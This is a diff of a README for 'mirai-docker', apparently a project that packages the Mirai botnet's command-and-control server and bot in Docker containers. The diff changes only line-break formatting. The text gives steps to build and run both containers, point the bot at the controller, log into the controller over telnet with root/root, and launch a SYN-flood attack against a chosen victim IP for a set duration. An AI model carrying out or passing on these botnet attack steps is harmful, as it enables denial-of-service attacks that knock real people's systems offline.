@@ -1,16 +1,16 @@
 # mirai-docker
 
 ## CNC
-Build: `$ sudo docker build -t cnc .`\n
-Run: `$ sudo docker run -i -t cnc`\n
+Build: `$ sudo docker build -t cnc .`  
+Run: `$ sudo docker run -i -t cnc`  
 
 ## BOT
-Build: `$ sudo docker build -t bot .`\n
-Run: `$ sudo docker run -i -t bot`\n
-Start Bot: `$ init.sh "IP of CNC" `\n
+Build: `$ sudo docker build -t bot .`  
+Run: `$ sudo docker run -i -t bot`  
+Start Bot: `$ init.sh "IP of CNC" `  
 
 ## Attack Instructions
-Connect to CNC: `$ telnet "IP of CNC"`\n
-username: root\n
-password: root\n
-attack: `$ syn "IP of Victim" "duration of attack"`\n
+Connect to CNC: `$ telnet "IP of CNC"`  
+username: root  
+password: root  
+attack: `$ syn "IP of Victim" "duration of attack"`  
